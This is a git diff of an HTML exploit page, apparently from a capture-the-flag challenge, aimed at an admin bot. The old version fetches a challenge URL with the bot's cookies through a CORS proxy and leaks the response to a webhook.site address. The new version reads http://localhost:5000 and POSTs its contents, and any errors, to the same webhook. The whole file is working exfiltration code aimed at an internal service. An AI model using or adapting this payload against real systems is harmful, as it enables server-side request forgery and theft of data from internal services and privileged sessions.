@@ -1,24 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>SSRF Exploit</title>
     <script>
-        // Step 1: Fetch the vulnerable URL with query params through AllOrigins proxy
-        fetch('https://api.allorigins.win/raw?url=http://chal1.lagncra.sh:8426/?lang=en', {
-            credentials: 'include' // Include admin's cookies in the request
-        })
-        .then(response => response.text()) // Read response as text
-        .then(data => {
-            // Step 2: Exfiltrate the entire response body (including cookies) to your webhook
-            fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e/steal?lang_response=' + encodeURIComponent(data), {
-                headers: {
-                    'Origin': 'http://chal1.lagncra.sh:8426' // Ensure Origin header is set correctly
-                }
+        // Step 1: Fetch content from localhost:5000
+        fetch('http://localhost:5000')
+            .then(response => response.text()) // Read response as text
+            .then(data => {
+                // Step 2: Send the fetched data to your webhook
+                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
+                    method: 'POST', // Send as a POST request
+                    headers: { 'Content-Type': 'application/json' }, // Content-Type for JSON
+                    body: JSON.stringify({ response: data }) // Send the data in JSON format
+                });
+            })
+            .catch(error => {
+                // Step 3: Handle errors and send them to your webhook
+                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ error: error.message })
+                });
             });
-        });
     </script>
 </head>
 <body>
-    <p>Exploiting admin bot...</p>
+    <p>Fetching content from localhost:5000 and sending to webhook...</p>
 </body>
 </html>
